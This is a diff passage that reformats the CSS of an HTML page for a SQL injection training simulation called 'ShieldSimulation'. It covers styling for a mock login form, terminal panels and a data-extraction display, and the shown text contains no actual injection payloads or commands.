@@ -1,629 +1,1729 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-<meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>ShieldSimulation — SQL Injection Level 2: Offensive Operations</title>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
-<style>
-:root{
-  --bg:#040d1a;--bg2:#061020;--card:#0a1628;--border:#1a3a5c;--border2:#0f2744;
-  --cyan:#00f5ff;--cyan2:#00bcd4;--green:#00ff88;--red:#ff3366;--yellow:#ffd700;
-  --orange:#ff6b35;--purple:#a855f7;--text:#c8dff0;--text2:#7a9ab8;
-  --glow:0 0 20px rgba(0,245,255,0.4);
-}
-*{margin:0;padding:0;box-sizing:border-box;}
-html,body{width:100%;height:100%;background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;overflow:hidden;}
-body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.02) 2px,rgba(0,0,0,0.02) 4px);pointer-events:none;z-index:9998;}
-#gridbg{position:fixed;inset:0;background-image:linear-gradient(rgba(0,245,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,245,255,0.025) 1px,transparent 1px);background-size:50px 50px;pointer-events:none;z-index:0;}
-#nav{position:fixed;top:0;left:0;right:0;z-index:500;display:flex;align-items:center;justify-content:space-between;padding:14px 48px;background:rgba(4,13,26,0.94);backdrop-filter:blur(18px);border-bottom:1px solid var(--border2);}
-.nav-logo{display:flex;align-items:center;gap:10px;}
-.nav-logo-icon{width:34px;height:34px;background:linear-gradient(135deg,var(--cyan),var(--cyan2));border-radius:7px;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-weight:900;font-size:15px;color:#040d1a;box-shadow:var(--glow);}
-.nav-logo-text{font-family:'Orbitron',sans-serif;font-size:17px;font-weight:700;color:#fff;}
-.nav-links{display:flex;gap:28px;}
-.nav-links a{color:var(--text2);font-size:13px;font-weight:500;letter-spacing:1px;text-transform:uppercase;cursor:default;transition:color .2s;}
-.nav-links a:hover{color:var(--cyan);}
-.nav-right{display:flex;align-items:center;gap:14px;}
-#navUser{font-family:'Share Tech Mono',monospace;color:var(--cyan);font-size:13px;display:none;}
-#navUser.show{display:block;}
-#navLogout{background:transparent;border:1px solid var(--border);color:var(--text2);padding:6px 14px;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:1px;cursor:pointer;border-radius:4px;transition:all .2s;display:none;}
-#navLogout.show{display:block;}
-#navLogout:hover{border-color:var(--red);color:var(--red);}
-#statusbar{position:fixed;bottom:0;left:0;right:0;z-index:500;background:rgba(4,13,26,0.96);border-top:1px solid var(--border2);padding:7px 48px;display:flex;justify-content:space-between;align-items:center;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);}
-.sdot{width:7px;height:7px;border-radius:50%;background:var(--green);display:inline-block;margin-right:7px;animation:gp 2s infinite;}
-.sdot.red{background:var(--red);animation:rp 1s infinite;}
-@keyframes gp{0%,100%{box-shadow:0 0 5px var(--green);}50%{box-shadow:0 0 12px var(--green);}}
-@keyframes rp{0%,100%{box-shadow:0 0 5px var(--red);}50%{box-shadow:0 0 14px var(--red);}}
-.breadcrumb{display:flex;align-items:center;gap:10px;margin-bottom:28px;font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--text2);}
-.bc-link{color:var(--cyan);cursor:pointer;}
-.bc-link:hover{text-decoration:underline;}
-.bc-sep{color:var(--border);}
-.callout{background:rgba(0,245,255,0.05);border:1px solid rgba(0,245,255,0.2);border-left:3px solid var(--cyan);border-radius:8px;padding:18px 20px;margin-bottom:22px;font-size:14px;line-height:1.7;color:var(--text2);}
-.callout strong{color:var(--cyan);}
-.callout.warn{background:rgba(255,215,0,0.04);border-color:rgba(255,215,0,0.2);border-left-color:var(--yellow);}
-.callout.warn strong{color:var(--yellow);}
-.callout.danger{background:rgba(255,51,102,0.04);border-color:rgba(255,51,102,0.2);border-left-color:var(--red);}
-.callout.danger strong{color:var(--red);}
-.main-scroll{position:fixed;inset:0;overflow-y:auto;overflow-x:hidden;z-index:1;padding:90px 40px 80px;}
-.inner{max-width:1200px;margin:0 auto;}
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+  <title>ShieldSimulation — SQL Injection Level 2: Offensive Operations</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&display=swap"
+    rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #040d1a;
+      --bg2: #061020;
+      --card: #0a1628;
+      --border: #1a3a5c;
+      --border2: #0f2744;
+      --cyan: #00f5ff;
+      --cyan2: #00bcd4;
+      --green: #00ff88;
+      --red: #ff3366;
+      --yellow: #ffd700;
+      --orange: #ff6b35;
+      --purple: #a855f7;
+      --text: #c8dff0;
+      --text2: #7a9ab8;
+      --glow: 0 0 20px rgba(0, 245, 255, 0.4);
+    }
 
-/* Level 2 specific */
-@keyframes glitch{0%,100%{clip-path:inset(0 0 98% 0);transform:translate(-2px,0);}20%{clip-path:inset(30% 0 50% 0);transform:translate(2px,0);}40%{clip-path:inset(60% 0 20% 0);transform:translate(-1px,0);}60%{clip-path:inset(80% 0 5% 0);transform:translate(1px,0);}80%{clip-path:inset(10% 0 80% 0);transform:translate(-2px,0);}}
-.glitch-wrap{position:relative;display:inline-block;}
-.glitch-wrap::before,.glitch-wrap::after{content:attr(data-text);position:absolute;top:0;left:0;width:100%;height:100%;}
-.glitch-wrap::before{color:var(--red);animation:glitch 3s infinite linear;opacity:.7;}
-.glitch-wrap::after{color:var(--cyan);animation:glitch 3s infinite linear reverse;opacity:.7;animation-delay:.15s;}
-.ops-layout{display:grid;grid-template-columns:380px 1fr;gap:22px;align-items:start;}
-.bio-card{background:var(--card);border:1px solid var(--border2);border-radius:14px;overflow:hidden;position:sticky;top:0;}
-.bio-header{background:linear-gradient(135deg,rgba(255,51,102,0.12),rgba(168,85,247,0.08));border-bottom:1px solid var(--border2);padding:18px 22px;display:flex;align-items:center;gap:12px;}
-.bio-status{width:9px;height:9px;border-radius:50%;background:var(--red);animation:rp 1s infinite;flex-shrink:0;}
-.bio-header-text{font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:2px;color:var(--red);}
-.bio-avatar{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#1a2a3a,#0a1628);border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:36px;margin:22px auto 14px;}
-.bio-name{font-family:'Orbitron',sans-serif;font-size:17px;font-weight:700;color:#fff;text-align:center;margin-bottom:4px;}
-.bio-role{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);text-align:center;margin-bottom:22px;}
-.bio-rows{padding:0 22px 22px;}
-.bio-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid var(--border2);}
-.bio-row:last-child{border-bottom:none;}
-.bio-key{font-family:'Orbitron',sans-serif;font-size:9px;letter-spacing:2px;color:var(--text2);}
-.bio-val{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--cyan);}
-.intel-tag{display:inline-flex;align-items:center;gap:6px;background:rgba(255,51,102,0.1);border:1px solid rgba(255,51,102,0.3);color:var(--red);font-family:'Orbitron',sans-serif;font-size:8px;letter-spacing:1px;padding:3px 9px;border-radius:3px;margin-top:14px;}
-.ops-panel{display:flex;flex-direction:column;gap:18px;}
-.step-card{background:var(--card);border:1px solid var(--border2);border-radius:14px;overflow:hidden;transition:border-color .3s;}
-.step-card.s-active{border-color:rgba(0,245,255,0.4);box-shadow:0 0 30px rgba(0,245,255,0.07);}
-.step-card.s-done{border-color:rgba(0,255,136,0.35);}
-.step-card.s-locked{opacity:.45;pointer-events:none;}
-.step-hdr{padding:18px 22px;display:flex;align-items:center;gap:14px;border-bottom:1px solid var(--border2);}
-.step-num{width:32px;height:32px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-size:11px;font-weight:700;color:var(--text2);flex-shrink:0;transition:all .3s;}
-.s-active .step-num{border-color:var(--cyan);color:var(--cyan);background:rgba(0,245,255,0.1);box-shadow:0 0 12px rgba(0,245,255,0.3);}
-.s-done .step-num{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.1);}
-.step-meta{flex:1;}
-.step-title{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:700;color:#fff;margin-bottom:2px;}
-.step-sub{font-size:12px;color:var(--text2);}
-.step-badge{font-family:'Orbitron',sans-serif;font-size:8px;letter-spacing:1px;padding:4px 10px;border-radius:4px;}
-.badge-active{background:rgba(0,245,255,.1);border:1px solid var(--cyan);color:var(--cyan);}
-.badge-done{background:rgba(0,255,136,.1);border:1px solid var(--green);color:var(--green);}
-.badge-locked{background:rgba(122,154,184,.08);border:1px solid var(--border);color:var(--text2);}
-.step-body{padding:22px;}
-.login-sim{background:#020a14;border:1px solid var(--border2);border-radius:12px;overflow:hidden;margin-bottom:16px;}
-.login-sim-bar{background:#0a1628;border-bottom:1px solid var(--border2);padding:10px 16px;display:flex;align-items:center;gap:10px;}
-.ls-dot{width:9px;height:9px;border-radius:50%;}
-.ls-url{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);margin-left:8px;}
-.login-sim-body{padding:24px;}
-.ls-title{font-family:'Orbitron',sans-serif;font-size:14px;font-weight:700;color:#fff;margin-bottom:4px;text-align:center;}
-.ls-sub{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);text-align:center;margin-bottom:18px;}
-.ls-field{margin-bottom:12px;}
-.ls-label{font-family:'Orbitron',sans-serif;font-size:9px;letter-spacing:2px;color:var(--text2);margin-bottom:5px;}
-.ls-input{width:100%;background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:6px;padding:10px 14px;color:#fff;font-family:'Share Tech Mono',monospace;font-size:13px;outline:none;transition:all .2s;}
-.ls-input:focus{border-color:var(--cyan);}
-.ls-input.injected{border-color:var(--red);color:var(--red);}
-.ls-input.clean{border-color:var(--border);color:var(--text2);}
-.ls-btn{width:100%;padding:11px;background:linear-gradient(135deg,rgba(0,245,255,0.1),rgba(168,85,247,0.08));border:1px solid var(--cyan);color:var(--cyan);font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;cursor:pointer;border-radius:6px;transition:all .2s;margin-top:4px;}
-.ls-btn:hover{background:var(--cyan);color:#040d1a;}
-.ls-result{margin-top:14px;min-height:24px;font-family:'Share Tech Mono',monospace;font-size:12px;border-radius:6px;padding:10px 14px;display:none;}
-.ls-result.show{display:block;}
-.ls-result.fail{background:rgba(255,51,102,0.07);border:1px solid rgba(255,51,102,0.3);color:var(--red);}
-.ls-result.warn{background:rgba(255,189,0,0.07);border:1px solid rgba(255,189,0,0.3);color:var(--yellow);}
-.ls-result.success{background:rgba(0,255,136,0.07);border:1px solid rgba(0,255,136,0.3);color:var(--green);}
-.payload-hints{margin-bottom:16px;}
-.payload-hints-lbl{font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text2);margin-bottom:8px;}
-.hint-tags{display:flex;gap:8px;flex-wrap:wrap;}
-.hint-tag{background:rgba(0,245,255,0.06);border:1px solid var(--border2);color:var(--text2);font-family:'Share Tech Mono',monospace;font-size:11px;padding:3px 10px;border-radius:4px;cursor:pointer;transition:all .2s;}
-.hint-tag:hover{border-color:var(--cyan);color:var(--cyan);}
-.attempts-counter{font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);margin-bottom:12px;}
-.attempts-counter span{color:var(--yellow);}
-.vuln-popup{display:none;background:linear-gradient(135deg,rgba(0,255,136,0.07),rgba(0,245,255,0.04));border:1px solid rgba(0,255,136,0.35);border-radius:12px;padding:20px;margin-top:16px;}
-.vuln-popup.show{display:block;animation:popIn .4s cubic-bezier(.34,1.56,.64,1);}
-@keyframes popIn{0%{opacity:0;transform:scale(.9) translateY(8px);}100%{opacity:1;transform:scale(1) translateY(0);}}
-.vuln-title{font-family:'Orbitron',sans-serif;font-size:12px;font-weight:700;color:var(--green);margin-bottom:8px;display:flex;align-items:center;gap:8px;}
-.vuln-body{font-size:13px;color:var(--text2);line-height:1.65;}
-.vuln-body strong{color:var(--cyan);}
-.terminal{background:#020a14;border:1px solid var(--border2);border-radius:10px;overflow:hidden;margin-bottom:14px;}
-.terminal-bar{background:#0a1628;border-bottom:1px solid var(--border2);padding:9px 14px;display:flex;align-items:center;gap:8px;}
-.t-dot{width:10px;height:10px;border-radius:50%;}
-.t-red{background:#ff5f57;}.t-yellow{background:#ffbd2e;}.t-green-dot{background:#28c840;}
-.terminal-title{font-family:'Orbitron',sans-serif;font-size:9px;letter-spacing:2px;color:var(--text2);margin-left:auto;}
-.terminal-body{padding:16px;height:240px;overflow-y:auto;font-family:'Share Tech Mono',monospace;font-size:12px;line-height:1.7;}
-.terminal-body::-webkit-scrollbar{width:4px;}
-.terminal-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
-.t-line{margin-bottom:2px;}
-.t-cmd{color:var(--cyan);}
-.t-fail{color:rgba(255,51,102,0.7);}
-.t-warn{color:var(--yellow);}
-.t-ok{color:var(--green);font-weight:bold;}
-.t-dim{color:rgba(122,154,184,0.5);}
-.t-data{color:var(--purple);font-weight:bold;}
-.btn-launch{width:100%;padding:13px;background:linear-gradient(135deg,rgba(255,107,53,0.15),rgba(255,51,102,0.1));border:1px solid var(--orange);color:var(--orange);font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:2px;cursor:pointer;border-radius:8px;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:10px;}
-.btn-launch:hover:not(:disabled){background:var(--orange);color:#040d1a;}
-.btn-launch:disabled{opacity:.4;cursor:not-allowed;}
-.dict-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:12px;}
-.dstat{background:var(--bg2);border:1px solid var(--border2);border-radius:8px;padding:12px;text-align:center;}
-.dstat-val{font-family:'Orbitron',sans-serif;font-size:18px;font-weight:700;color:var(--cyan);}
-.dstat-lbl{font-size:10px;color:var(--text2);letter-spacing:1px;margin-top:3px;}
-.extract-machine{background:var(--bg2);border:1px solid var(--border2);border-radius:12px;padding:24px;margin-bottom:16px;}
-.extract-label{font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;color:var(--text2);margin-bottom:16px;text-align:center;}
-.db-table{width:100%;border-collapse:collapse;font-family:'Share Tech Mono',monospace;font-size:12px;margin-bottom:16px;}
-.db-table th{background:rgba(0,245,255,0.08);border:1px solid var(--border2);padding:8px 12px;color:var(--cyan);font-family:'Orbitron',sans-serif;font-size:9px;letter-spacing:1px;text-align:left;}
-.db-table td{border:1px solid var(--border2);padding:8px 12px;color:var(--text2);transition:all .3s;}
-.db-table td.revealed{color:var(--green);background:rgba(0,255,136,0.05);}
-.db-table td.spinning{color:var(--yellow);}
-.extract-progress{margin-bottom:14px;}
-.ep-lbl{display:flex;justify-content:space-between;font-size:11px;color:var(--text2);font-family:'Share Tech Mono',monospace;margin-bottom:5px;}
-.ep-track{background:var(--bg);border-radius:3px;height:5px;overflow:hidden;}
-.ep-fill{height:100%;background:linear-gradient(90deg,var(--purple),var(--cyan));border-radius:3px;width:0%;transition:width .4s;}
-.query-display{background:#020a14;border:1px solid var(--border2);border-radius:8px;padding:12px 16px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text2);margin-bottom:14px;word-break:break-all;line-height:1.6;}
-.query-display .inj{color:var(--red);}
-.query-display .kw{color:var(--cyan);}
-.btn-extract{width:100%;padding:13px;background:linear-gradient(135deg,rgba(255,51,102,0.18),rgba(168,85,247,0.12));border:1px solid var(--red);color:var(--red);font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:2px;cursor:pointer;border-radius:8px;transition:all .2s;}
-.btn-extract:hover:not(:disabled){background:var(--red);color:#fff;box-shadow:0 0 28px rgba(255,51,102,0.4);}
-.btn-extract:disabled{opacity:.4;cursor:not-allowed;}
-.breach-alert{display:none;background:linear-gradient(135deg,rgba(255,51,102,0.12),rgba(168,85,247,0.07));border:2px solid var(--red);border-radius:12px;padding:22px;text-align:center;margin-top:14px;}
-.breach-alert.show{display:block;animation:popIn .5s cubic-bezier(.34,1.56,.64,1);}
-.breach-ico{font-size:44px;margin-bottom:10px;}
-.breach-title{font-family:'Orbitron',sans-serif;font-size:18px;font-weight:900;color:var(--red);text-shadow:0 0 20px rgba(255,51,102,0.5);margin-bottom:6px;}
-.breach-sub{color:var(--text2);font-size:13px;line-height:1.6;margin-bottom:16px;}
-.breach-sub strong{color:var(--cyan);}
-.btn-complete{padding:13px 36px;background:linear-gradient(135deg,var(--green),#00cc66);border:none;border-radius:8px;color:#040d1a;font-family:'Orbitron',sans-serif;font-size:12px;font-weight:700;letter-spacing:2px;cursor:pointer;transition:all .2s;box-shadow:0 0 28px rgba(0,255,136,0.3);}
-.btn-complete:hover{transform:translateY(-2px);box-shadow:0 0 44px rgba(0,255,136,0.5);}
-.l2-progress{background:var(--card);border:1px solid var(--border2);border-radius:12px;padding:16px 22px;margin-bottom:22px;display:flex;align-items:center;gap:18px;}
-.l2-prog-label{font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;color:var(--text2);white-space:nowrap;}
-.l2-prog-track{flex:1;background:var(--bg2);border-radius:4px;height:6px;overflow:hidden;}
-.l2-prog-fill{height:100%;background:linear-gradient(90deg,var(--red),var(--purple),var(--cyan));border-radius:4px;transition:width .8s ease;width:0%;}
-.l2-prog-pct{font-family:'Orbitron',sans-serif;font-size:13px;font-weight:700;color:var(--cyan);min-width:36px;text-align:right;}
-@media(max-width:860px){
-  .ops-layout{grid-template-columns:1fr;}
-  .bio-card{position:static;}
-  .dict-stats{grid-template-columns:1fr 1fr;}
-  #nav{padding:12px 20px;}
-  #statusbar{padding:7px 20px;}
-  .main-scroll{padding:80px 20px 70px;}
-}
-</style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Rajdhani', sans-serif;
+      overflow: hidden;
+    }
+
+    body::after {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 0, 0, 0.02) 2px, rgba(0, 0, 0, 0.02) 4px);
+      pointer-events: none;
+      z-index: 9998;
+    }
+
+    #gridbg {
+      position: fixed;
+      inset: 0;
+      background-image: linear-gradient(rgba(0, 245, 255, 0.025) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 245, 255, 0.025) 1px, transparent 1px);
+      background-size: 50px 50px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    #nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 500;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 48px;
+      background: rgba(4, 13, 26, 0.94);
+      backdrop-filter: blur(18px);
+      border-bottom: 1px solid var(--border2);
+    }
+
+    .nav-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .nav-logo-icon {
+      width: 34px;
+      height: 34px;
+      background: linear-gradient(135deg, var(--cyan), var(--cyan2));
+      border-radius: 7px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Orbitron', sans-serif;
+      font-weight: 900;
+      font-size: 15px;
+      color: #040d1a;
+      box-shadow: var(--glow);
+    }
+
+    .nav-logo-text {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      color: #fff;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 28px;
+    }
+
+    .nav-links a {
+      color: var(--text2);
+      font-size: 13px;
+      font-weight: 500;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      cursor: default;
+      transition: color .2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--cyan);
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    #navUser {
+      font-family: 'Share Tech Mono', monospace;
+      color: var(--cyan);
+      font-size: 13px;
+      display: none;
+    }
+
+    #navUser.show {
+      display: block;
+    }
+
+    #navLogout {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--text2);
+      padding: 6px 14px;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 10px;
+      letter-spacing: 1px;
+      cursor: pointer;
+      border-radius: 4px;
+      transition: all .2s;
+      display: none;
+    }
+
+    #navLogout.show {
+      display: block;
+    }
+
+    #navLogout:hover {
+      border-color: var(--red);
+      color: var(--red);
+    }
+
+    #statusbar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      z-index: 500;
+      background: rgba(4, 13, 26, 0.96);
+      border-top: 1px solid var(--border2);
+      padding: 7px 48px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--text2);
+    }
+
+    .sdot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      display: inline-block;
+      margin-right: 7px;
+      animation: gp 2s infinite;
+    }
+
+    .sdot.red {
+      background: var(--red);
+      animation: rp 1s infinite;
+    }
+
+    @keyframes gp {
+
+      0%,
+      100% {
+        box-shadow: 0 0 5px var(--green);
+      }
+
+      50% {
+        box-shadow: 0 0 12px var(--green);
+      }
+    }
+
+    @keyframes rp {
+
+      0%,
+      100% {
+        box-shadow: 0 0 5px var(--red);
+      }
+
+      50% {
+        box-shadow: 0 0 14px var(--red);
+      }
+    }
+
+    .breadcrumb {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 28px;
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 13px;
+      color: var(--text2);
+    }
+
+    .bc-link {
+      color: var(--cyan);
+      cursor: pointer;
+    }
+
+    .bc-link:hover {
+      text-decoration: underline;
+    }
+
+    .bc-sep {
+      color: var(--border);
+    }
+
+    .callout {
+      background: rgba(0, 245, 255, 0.05);
+      border: 1px solid rgba(0, 245, 255, 0.2);
+      border-left: 3px solid var(--cyan);
+      border-radius: 8px;
+      padding: 18px 20px;
+      margin-bottom: 22px;
+      font-size: 14px;
+      line-height: 1.7;
+      color: var(--text2);
+    }
+
+    .callout strong {
+      color: var(--cyan);
+    }
+
+    .callout.warn {
+      background: rgba(255, 215, 0, 0.04);
+      border-color: rgba(255, 215, 0, 0.2);
+      border-left-color: var(--yellow);
+    }
+
+    .callout.warn strong {
+      color: var(--yellow);
+    }
+
+    .callout.danger {
+      background: rgba(255, 51, 102, 0.04);
+      border-color: rgba(255, 51, 102, 0.2);
+      border-left-color: var(--red);
+    }
+
+    .callout.danger strong {
+      color: var(--red);
+    }
+
+    .main-scroll {
+      position: fixed;
+      inset: 0;
+      overflow-y: auto;
+      overflow-x: hidden;
+      z-index: 1;
+      padding: 90px 40px 80px;
+    }
+
+    .inner {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    /* Level 2 specific */
+    @keyframes glitch {
+
+      0%,
+      100% {
+        clip-path: inset(0 0 98% 0);
+        transform: translate(-2px, 0);
+      }
+
+      20% {
+        clip-path: inset(30% 0 50% 0);
+        transform: translate(2px, 0);
+      }
+
+      40% {
+        clip-path: inset(60% 0 20% 0);
+        transform: translate(-1px, 0);
+      }
+
+      60% {
+        clip-path: inset(80% 0 5% 0);
+        transform: translate(1px, 0);
+      }
+
+      80% {
+        clip-path: inset(10% 0 80% 0);
+        transform: translate(-2px, 0);
+      }
+    }
+
+    .glitch-wrap {
+      position: relative;
+      display: inline-block;
+    }
+
+    .glitch-wrap::before,
+    .glitch-wrap::after {
+      content: attr(data-text);
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    .glitch-wrap::before {
+      color: var(--red);
+      animation: glitch 3s infinite linear;
+      opacity: .7;
+    }
+
+    .glitch-wrap::after {
+      color: var(--cyan);
+      animation: glitch 3s infinite linear reverse;
+      opacity: .7;
+      animation-delay: .15s;
+    }
+
+    .ops-layout {
+      display: grid;
+      grid-template-columns: 380px 1fr;
+      gap: 22px;
+      align-items: start;
+    }
+
+    .bio-card {
+      background: var(--card);
+      border: 1px solid var(--border2);
+      border-radius: 14px;
+      overflow: hidden;
+      position: sticky;
+      top: 0;
+    }
+
+    .bio-header {
+      background: linear-gradient(135deg, rgba(255, 51, 102, 0.12), rgba(168, 85, 247, 0.08));
+      border-bottom: 1px solid var(--border2);
+      padding: 18px 22px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .bio-status {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--red);
+      animation: rp 1s infinite;
+      flex-shrink: 0;
+    }
+
+    .bio-header-text {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 11px;
+      letter-spacing: 2px;
+      color: var(--red);
+    }
+
+    .bio-avatar {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #1a2a3a, #0a1628);
+      border: 2px solid var(--border2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      margin: 22px auto 14px;
+    }
+
+    .bio-name {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      color: #fff;
+      text-align: center;
+      margin-bottom: 4px;
+    }
+
+    .bio-role {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--text2);
+      text-align: center;
+      margin-bottom: 22px;
+    }
+
+    .bio-rows {
+      padding: 0 22px 22px;
+    }
+
+    .bio-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid var(--border2);
+    }
+
+    .bio-row:last-child {
+      border-bottom: none;
+    }
+
+    .bio-key {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 9px;
+      letter-spacing: 2px;
+      color: var(--text2);
+    }
+
+    .bio-val {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 13px;
+      color: var(--cyan);
+    }
+
+    .intel-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(255, 51, 102, 0.1);
+      border: 1px solid rgba(255, 51, 102, 0.3);
+      color: var(--red);
+      font-family: 'Orbitron', sans-serif;
+      font-size: 8px;
+      letter-spacing: 1px;
+      padding: 3px 9px;
+      border-radius: 3px;
+      margin-top: 14px;
+    }
+
+    .ops-panel {
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .step-card {
+      background: var(--card);
+      border: 1px solid var(--border2);
+      border-radius: 14px;
+      overflow: hidden;
+      transition: border-color .3s;
+    }
+
+    .step-card.s-active {
+      border-color: rgba(0, 245, 255, 0.4);
+      box-shadow: 0 0 30px rgba(0, 245, 255, 0.07);
+    }
+
+    .step-card.s-done {
+      border-color: rgba(0, 255, 136, 0.35);
+    }
+
+    .step-card.s-locked {
+      opacity: .45;
+      pointer-events: none;
+    }
+
+    .step-hdr {
+      padding: 18px 22px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      border-bottom: 1px solid var(--border2);
+    }
+
+    .step-num {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text2);
+      flex-shrink: 0;
+      transition: all .3s;
+    }
+
+    .s-active .step-num {
+      border-color: var(--cyan);
+      color: var(--cyan);
+      background: rgba(0, 245, 255, 0.1);
+      box-shadow: 0 0 12px rgba(0, 245, 255, 0.3);
+    }
+
+    .s-done .step-num {
+      border-color: var(--green);
+      color: var(--green);
+      background: rgba(0, 255, 136, 0.1);
+    }
+
+    .step-meta {
+      flex: 1;
+    }
+
+    .step-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 2px;
+    }
+
+    .step-sub {
+      font-size: 12px;
+      color: var(--text2);
+    }
+
+    .step-badge {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 8px;
+      letter-spacing: 1px;
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    .badge-active {
+      background: rgba(0, 245, 255, .1);
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+    }
+
+    .badge-done {
+      background: rgba(0, 255, 136, .1);
+      border: 1px solid var(--green);
+      color: var(--green);
+    }
+
+    .badge-locked {
+      background: rgba(122, 154, 184, .08);
+      border: 1px solid var(--border);
+      color: var(--text2);
+    }
+
+    .step-body {
+      padding: 22px;
+    }
+
+    .login-sim {
+      background: #020a14;
+      border: 1px solid var(--border2);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+
+    .login-sim-bar {
+      background: #0a1628;
+      border-bottom: 1px solid var(--border2);
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .ls-dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+    }
+
+    .ls-url {
+      font-family: 'Share Tech Mono', monospace;
+      font-size: 11px;
+      color: var(--text2);
+      margin-left: 8px;
+    }
+
+    .login-sim-body {
+      padding: 24px;
+    }
+
+    .ls-title {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 14px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+      text-align: center;
+    }
+
+    .ls-sub {
